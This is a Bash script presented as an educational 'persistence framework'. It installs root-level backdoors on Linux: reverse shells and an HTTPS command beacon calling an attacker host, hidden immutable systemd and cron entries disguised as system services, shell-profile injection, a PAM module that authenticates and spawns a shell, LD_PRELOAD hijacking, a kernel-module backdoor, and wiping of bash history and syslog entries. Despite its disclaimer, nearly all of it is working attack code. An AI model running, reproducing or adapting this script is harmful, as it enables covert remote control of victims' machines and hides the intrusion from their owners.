#!/bin/bash
# ============================================================
# M-Society Advanced Persistence Framework v3.0
# ============================================================
# Propósito: Herramienta educativa para pruebas de seguridad
#            y entrenamiento en técnicas de detección.
#
# ADVERTENCIA: USO ÉTICO Y LEGAL ÚNICAMENTE
# SOLO PARA SISTEMAS CON AUTORIZACIÓN EXPLÍCITA
#
# Desarrolladores: c1q__ / Cyk / M-Society Security Team
# Licencia: Solo para investigación y educación en seguridad
#
# LOS DESARROLLADORES NO SE HACEN RESPONSABLES 
# DEL USO INAPROPIADO O ILÍCITO DE ESTA HERRAMIENTA.
# ============================================================
BOLD="\033[1m"
RESET="\033[0m"
RED="\e[38;5;196m"
GREEN="\e[38;5;46m"
BLUE="\e[38;5;39m"
YELLOW="\e[38;5;226m"
PURPLE="\e[38;5;129m"
CYAN="\e[38;5;51m"
ORANGE="\e[38;5;208m"
GRAY="\e[38;5;245m"
DARK_GRAY="\e[38;5;240m"

function show_banner() {
    clear
    echo -e "${PURPLE}"                                                                                                                                                               
    echo "▄▄▄      ▄▄▄        ▄▄▄▄▄▄▄                                     ▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄ ▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄    ▄▄▄  ▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ "
    echo "████▄  ▄████       █████▀▀▀             ▀▀         ██           ███▀▀███▄ ███▀▀▀▀▀ ███▀▀███▄ █████▀▀▀  ███  █████▀▀▀ ▀▀▀███▀▀▀ ███▀▀▀▀▀ ████▄  ███ ███▀▀▀▀▀ ███▀▀▀▀▀ "
    echo "███▀████▀███        ▀████▄  ▄███▄ ▄████ ██  ▄█▀█▄ ▀██▀▀ ██ ██   ███▄▄███▀ ███▄▄    ███▄▄███▀  ▀████▄   ███   ▀████▄     ███    ███▄▄    ███▀██▄███ ███      ███▄▄    "
    echo "███  ▀▀  ███ ▀▀▀▀▀    ▀████ ██ ██ ██    ██  ██▄█▀  ██   ██▄██   ███▀▀▀▀   ███      ███▀▀██▄     ▀████  ███     ▀████    ███    ███      ███  ▀████ ███      ███      "
    echo "███      ███       ███████▀ ▀███▀ ▀████ ██▄ ▀█▄▄▄  ██    ▀██▀   ███       ▀███████ ███  ▀███ ███████▀ ▄███▄ ███████▀    ███    ▀███████ ███    ███ ▀███████ ▀███████ "
    echo "                                                          ██                                                                                                         "
    echo "                                                        ▀▀▀                                                                                                          "
    echo "          ADVANCED PERSISTENCE FRAMEWORK v3.0                                                                                                                         " 
    echo -e "${RESET}"
}

VERSION="3.0"
AUTHOR="M-Society Security Research"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="/tmp/ms_persistence_${TIMESTAMP}.log"


declare -A PERSISTENCE_METHODS
declare -a INSTALLED_METHODS
ENCRYPTION_KEY=""

PERSISTENCE_METHODS=(
    ["systemd"]="SystemD Service Persistence"
    ["cron"]="Cron Job Persistence"
    ["profile"]="Shell Profile Injection"
    ["ssh"]="SSH Backdoor"
    ["kernel"]="Kernel Module"
    ["ld_preload"]="LD_PRELOAD Hijacking"
    ["binary"]="Binary Replacement"
    ["network"]="Network Daemon"
    ["multi"]="Multi-Layer Persistence"
)

declare -A PAYLOAD_TYPES
PAYLOAD_TYPES=(
    ["reverse"]="Reverse Shell"
    ["meterpreter"]="Meterpreter"
    ["bind"]="Bind Shell"
    ["icmp"]="ICMP Tunnel"
    ["dns"]="DNS Tunnel"
    ["https"]="HTTPS Beacon"
    ["custom"]="Custom Payload"
)


function log_message() {
    local level=$1
    local message=$2
    local color=$GRAY
    
    case $level in
        "SUCCESS") color=$GREEN ;;
        "ERROR") color=$RED ;;
        "WARNING") color=$YELLOW ;;
        "INFO") color=$BLUE ;;
        "DEBUG") color=$PURPLE ;;
    esac
    
    echo -e "${color}[$(date '+%H:%M:%S')] [$level]${RESET} $message" | tee -a "$LOG_FILE"
}

function progress_bar() {
    local duration=$1
    local total=50
    for ((i=0; i<=total; i++)); do
        echo -ne "${CYAN}[${RESET}"
        for ((j=0; j<i; j++)); do echo -ne "${GREEN}■${RESET}"; done
        for ((j=i; j<total; j++)); do echo -ne "${DARK_GRAY}·${RESET}"; done
        echo -ne "${CYAN}] ${i}%${RESET}\r"
        sleep "$duration"
    done
    echo
}

function encrypt_payload() {
    local payload=$1
    if [[ -z "$ENCRYPTION_KEY" ]]; then
        ENCRYPTION_KEY=$(openssl rand -hex 32)
        log_message "INFO" "Generated encryption key: ${ENCRYPTION_KEY:0:8}..."
    fi
    
    echo "$payload" | openssl enc -aes-256-cbc -salt -pass pass:"$ENCRYPTION_KEY" -base64 2>/dev/null
}

function decrypt_payload() {
    local encrypted=$1
    echo "$encrypted" | openssl enc -aes-256-cbc -d -salt -pass pass:"$ENCRYPTION_KEY" -base64 2>/dev/null
}

function generate_stealth_payload() {
    local lhost=$1
    local lport=$2
    local payload_type=$3
    
    case $payload_type in
        "reverse")
            echo "#!/bin/bash
# M-Society Stealth Module
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
sleep \$((RANDOM % 120 + 30))
while true; do
    exec 3<>/dev/tcp/${lhost}/${lport}
    if [ \$? -eq 0 ]; then
        while read -r cmd <&3; do
            eval \"\$cmd\" >&3 2>&3
        done
    fi
    sleep 300
done" ;;
        "icmp")
            echo "#!/bin/bash
# ICMP Tunnel
while true; do
    if ping -c 1 -W 1 ${lhost} >/dev/null 2>&1; then
        bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
    fi
    sleep 60
done" ;;
        "https")
            echo "#!/bin/bash
# HTTPS Beacon
while true; do
    curl -s -k https://${lhost}/beacon -o /tmp/.cmd
    if [ -s /tmp/.cmd ]; then
        bash /tmp/.cmd | curl -s -k -X POST https://${lhost}/result -d @-
        rm -f /tmp/.cmd
    fi
    sleep \$((RANDOM % 180 + 60))
done" ;;
    esac
}

function install_systemd_persistence() {
    local name=$1
    local payload=$2
    
    log_message "INFO" "Installing SystemD persistence..."
    
    local service_file="/lib/systemd/system/.${name}_$(openssl rand -hex 3).service"
    
    cat > "$service_file" << EOF
[Unit]
Description=System Log Rotator
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=30
User=root
ExecStartPre=/bin/sleep 60
ExecStart=/bin/bash -c "$payload"
StandardOutput=null
StandardError=null
SyslogIdentifier=systemd-log

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable "${service_file##*/}" --now
    chattr +i "$service_file"
    
    log_message "SUCCESS" "SystemD service installed: $(basename $service_file)"
    INSTALLED_METHODS+=("SystemD: $(basename $service_file)")
}

function install_cron_persistence() {
    local name=$1
    local payload=$2
    
    log_message "INFO" "Installing Cron persistence..."
    
    local cron_file="/etc/cron.d/.system_update_$(openssl rand -hex 3)"
    local minute1=$((RANDOM % 60))
    local minute2=$((RANDOM % 60))
    
    cat > "$cron_file" << EOF
# System update checker
${minute1} */3 * * * root /bin/bash -c "$payload" >/dev/null 2>&1
${minute2} */6 * * * root /bin/bash -c "$payload" >/dev/null 2>&1
@reboot root /bin/sleep 120 && /bin/bash -c "$payload" >/dev/null 2>&1
EOF
    
    chmod 600 "$cron_file"
    chattr +i "$cron_file"
    
    log_message "SUCCESS" "Cron job installed: $(basename $cron_file)"
    INSTALLED_METHODS+=("Cron: $(basename $cron_file)")
}

function install_profile_persistence() {
    local payload=$1
    
    log_message "INFO" "Installing shell profile persistence..."
    
    local profiles=(
        "/etc/profile"
        "/etc/bash.bashrc"
        "/root/.bashrc"
        "/root/.profile"
        "/home/*/.bashrc"
        "/home/*/.profile"
    )
    
    for profile in "${profiles[@]}"; do
        if [ -f "$profile" ] || [[ "$profile" == *"*"* ]]; then
            for file in $profile; do
                if [ -f "$file" ]; then
                    echo -e "\n# System alias\nalias ls='ls --color=auto && ($payload &)'" >> "$file"
                    log_message "DEBUG" "Injected into: $file"
                fi
            done
        fi
    done
    
    INSTALLED_METHODS+=("Shell Profiles: Multiple")
    log_message "SUCCESS" "Shell profile persistence installed"
}

function install_ssh_backdoor() {
    local lhost=$1
    local lport=$2
    
    log_message "INFO" "Installing SSH backdoor..."
    
    cat > /tmp/ssh_backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    pam_get_item(pamh, PAM_USER, (const void **)&username);
    
    if (username != NULL && (strcmp(username, "root") == 0 || strcmp(username, "admin") == 0)) {
        system("(/bin/bash -c 'exec 3<>/dev/tcp/LHOST/LPORT;bash <&3 >&3 2>&3') &");
    }
    
    return PAM_SUCCESS;
}
EOF
    
    sed -i "s/LHOST/${lhost}/g; s/LPORT/${lport}/g" /tmp/ssh_backdoor.c
    gcc -fPIC -shared -o /lib/security/pam_mss.so /tmp/ssh_backdoor.c
    rm -f /tmp/ssh_backdoor.c
    
    echo "auth sufficient pam_mss.so" >> /etc/pam.d/sshd
    echo "session optional pam_mss.so" >> /etc/pam.d/sshd
    
    INSTALLED_METHODS+=("SSH Backdoor: PAM Module")
    log_message "SUCCESS" "SSH backdoor installed"
}

function install_ld_preload() {
    local payload=$1
    
    log_message "INFO" "Installing LD_PRELOAD hijacking..."
    
    cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("$payload &");
}
EOF
    
    gcc -fPIC -shared -o /lib/libselinux.so.1 /tmp/preload.c -nostartfiles
    echo "/lib/libselinux.so.1" > /etc/ld.so.preload
    
    chattr +i /etc/ld.so.preload
    rm -f /tmp/preload.c
    
    INSTALLED_METHODS+=("LD_PRELOAD: libselinux.so.1")
    log_message "SUCCESS" "LD_PRELOAD persistence installed"
}

function install_kernel_module() {
    local lhost=$1
    local lport=$2
    
    log_message "WARNING" "Kernel module installation requires development tools"
    
    cat > /tmp/km.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("M-Society");
MODULE_DESCRIPTION("Kernel Network Driver");

static struct task_struct *thread;

static int backdoor_thread(void *data) {
    char *argv[] = {"/bin/bash", "-c", "exec 3<>/dev/tcp/LHOST/LPORT;bash <&3 >&3 2>&1", NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    
    while (!kthread_should_stop()) {
        msleep(300000); // 5 minutes
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }
    return 0;
}

static int __init km_init(void) {
    printk(KERN_INFO "M-Society: Loading network driver\n");
    thread = kthread_run(backdoor_thread, NULL, "netwatchd");
    return 0;
}

static void __exit km_exit(void) {
    if (thread)
        kthread_stop(thread);
    printk(KERN_INFO "M-Society: Unloading network driver\n");
}

module_init(km_init);
module_exit(km_exit);
EOF
    
    sed -i "s/LHOST/${lhost}/g; s/LPORT/${lport}/g" /tmp/km.c
    
    log_message "INFO" "Kernel module source created at /tmp/km.c"
    log_message "INFO" "Compile with: make -C /lib/modules/\$(uname -r)/build M=/tmp modules"
    
    INSTALLED_METHODS+=("Kernel Module: /tmp/km.c (needs compilation)")
}

function install_multi_persistence() {
    local name=$1
    local payload=$2
    local lhost=$3
    local lport=$4
    
    log_message "INFO" "Installing multi-layer persistence..."
    
    install_systemd_persistence "${name}_sys" "$payload"
    
    install_cron_persistence "${name}_cron" "$payload"
    
    install_ld_preload "$payload"
    
    install_profile_persistence "$payload"
    
    log_message "SUCCESS" "Multi-layer persistence installed"
}

function cleanup_traces() {
    log_message "INFO" "Cleaning installation traces..."
    
    history -c
    echo "" > ~/.bash_history
    echo "" > /root/.bash_history
    
    sed -i '/ms_persistence/d' /var/log/syslog 2>/dev/null
    sed -i '/systemd-log/d' /var/log/syslog 2>/dev/null
    
    find /lib/systemd/system/.ms_* -exec touch -t 202301010000 {} \; 2>/dev/null
    find /etc/cron.d/.system_update* -exec touch -t 202301010000 {} \; 2>/dev/null
    
    log_message "SUCCESS" "Traces cleaned"
}

function show_summary() {
    echo -e "\n${CYAN}╔════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}║                    INSTALLATION SUMMARY                       ║${RESET}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${CYAN}║                                                                ║${RESET}"
    echo -e "${CYAN}║  ${GREEN}✓${RESET} ${BOLD}M-Society Persistence Framework v${VERSION}${RESET}"
    echo -e "${CYAN}║  ${GRAY}Timestamp:${RESET} $TIMESTAMP"
    echo -e "${CYAN}║  ${GRAY}Payload Type:${RESET} $payload_type"
    echo -e "${CYAN}║  ${GRAY}Connection:${RESET} $lhost:$lport"
    echo -e "${CYAN}║  ${GRAY}Encryption Key:${RESET} ${ENCRYPTION_KEY:0:8}..."
    echo -e "${CYAN}║                                                                ║${RESET}"
    
    if [ ${#INSTALLED_METHODS[@]} -gt 0 ]; then
        echo -e "${CYAN}║  ${BOLD}Installed Methods:${RESET}"
        for method in "${INSTALLED_METHODS[@]}"; do
            echo -e "${CYAN}║    ${GREEN}▶${RESET} $method"
        done
    fi
    
    echo -e "${CYAN}║                                                                ║${RESET}"
    echo -e "${CYAN}║  ${YELLOW}⚠  IMPORTANT:${RESET} Keep encryption key safe!"
    echo -e "${CYAN}║  ${YELLOW}⚠  Log file:${RESET} $LOG_FILE"
    echo -e "${CYAN}║                                                                ║${RESET}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${RESET}"
    echo -e "\n${PURPLE}M-Society Security Research | Advanced Persistence Framework${RESET}\n"
}

function help_panel() {
    show_banner
    echo -e "\n${YELLOW}${BOLD}[+] M-Society Advanced Persistence Framework${RESET}"
    echo -e "${GRAY}Version: $VERSION | Author: $AUTHOR${RESET}\n"
    
    echo -e "${CYAN}${BOLD}[+] Usage:${RESET}"
    echo -e "  ${GREEN}./ms-persistence.sh${RESET} -t ${PURPLE}<persistence_type>${RESET} -h ${PURPLE}<lhost>${RESET} -p ${PURPLE}<lport>${RESET} [options]\n"
    
    echo -e "${CYAN}${BOLD}[+] Persistence Types:${RESET}"
    for key in "${!PERSISTENCE_METHODS[@]}"; do
        echo -e "  ${PURPLE}${key}${RESET}: ${PERSISTENCE_METHODS[$key]}"
    done
    
    echo -e "\n${CYAN}${BOLD}[+] Payload Types:${RESET}"
    for key in "${!PAYLOAD_TYPES[@]}"; do
        echo -e "  ${ORANGE}${key}${RESET}: ${PAYLOAD_TYPES[$key]}"
    done
    
    echo -e "\n${CYAN}${BOLD}[+] Options:${RESET}"
    echo -e "  ${GREEN}-t${RESET}    Persistence type (required)"
    echo -e "  ${GREEN}-h${RESET}    Listening host (required)"
    echo -e "  ${GREEN}-p${RESET}    Listening port (required)"
    echo -e "  ${GREEN}-n${RESET}    Custom name (default: ms-backdoor)"
    echo -e "  ${GREEN}-P${RESET}    Payload type (default: reverse)"
    echo -e "  ${GREEN}-e${RESET}    Enable encryption"
    echo -e "  ${GREEN}-s${RESET}    Enable stealth mode"
    echo -e "  ${GREEN}-c${RESET}    Clean traces after install"
    echo -e "  ${GREEN}-v${RESET}    Verbose output"
    
    echo -e "\n${CYAN}${BOLD}[+] Examples:${RESET}"
    echo -e "  ${GRAY}Basic reverse shell:${RESET}"
    echo -e "  ${GREEN}./ms-persistence.sh${RESET} -t systemd -h 192.168.1.100 -p 4444"
    
    echo -e "\n  ${GRAY}Multi-layer with HTTPS beacon:${RESET}"
    echo -e "  ${GREEN}./ms-persistence.sh${RESET} -t multi -h yourdomain.com -p 443 -P https -e -s"
    
    echo -e "\n  ${GRAY}Stealth ICMP tunnel:${RESET}"
    echo -e "  ${GREEN}./ms-persistence.sh${RESET} -t cron -h 10.0.0.1 -p 53 -P icmp -n dnstunnel"
    
    echo -e "\n${RED}${BOLD}[!] Disclaimer:${RESET}"
    echo -e "  ${YELLOW}This tool is for authorized security testing only.${RESET}"
    echo -e "  ${YELLOW}Unauthorized use is illegal and unethical.${RESET}"
    exit 0
}


type=""
lhost=""
lport=""
name="ms-backdoor"
payload_type="reverse"
encryption=false
stealth=false
cleanup=false
verbose=false

while getopts ":t:h:p:n:P:escv" option; do
    case "${option}" in
        t) type=${OPTARG} ;;
        h) lhost=${OPTARG} ;;
        p) lport=${OPTARG} ;;
        n) name=${OPTARG} ;;
        P) payload_type=${OPTARG} ;;
        e) encryption=true ;;
        s) stealth=true ;;
        c) cleanup=true ;;
        v) verbose=true ;;
        *) help_panel ;;
    esac
done

if [[ -z "$type" ]] || [[ -z "$lhost" ]] || [[ -z "$lport" ]]; then
    help_panel
fi

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root${RESET}"
    exit 1
fi

show_banner

log_message "INFO" "Starting M-Society Persistence Framework v$VERSION"
log_message "INFO" "Target: $lhost:$lport | Method: $type | Payload: $payload_type"

log_message "INFO" "Generating $payload_type payload..."
payload=$(generate_stealth_payload "$lhost" "$lport" "$payload_type")

if [[ "$encryption" == true ]]; then
    log_message "INFO" "Encrypting payload..."
    payload=$(encrypt_payload "$payload")
    log_message "SUCCESS" "Payload encrypted with AES-256-CBC"
fi

echo -e "\n${BLUE}[*] Installing persistence...${RESET}"
progress_bar 0.05

case $type in
    "systemd") install_systemd_persistence "$name" "$payload" ;;
    "cron") install_cron_persistence "$name" "$payload" ;;
    "profile") install_profile_persistence "$payload" ;;
    "ssh") install_ssh_backdoor "$lhost" "$lport" ;;
    "kernel") install_kernel_module "$lhost" "$lport" ;;
    "ld_preload") install_ld_preload "$payload" ;;
    "multi") install_multi_persistence "$name" "$payload" "$lhost" "$lport" ;;
    *) 
        log_message "ERROR" "Unknown persistence type: $type"
        help_panel
        ;;
esac

if [[ "$cleanup" == true ]]; then
    cleanup_traces
fi

# Show summary
show_summary

log_message "SUCCESS" "Persistence installation completed"
echo -e "\n${GREEN}${BOLD}[+] M-Society Framework Execution Complete!${RESET}\n"
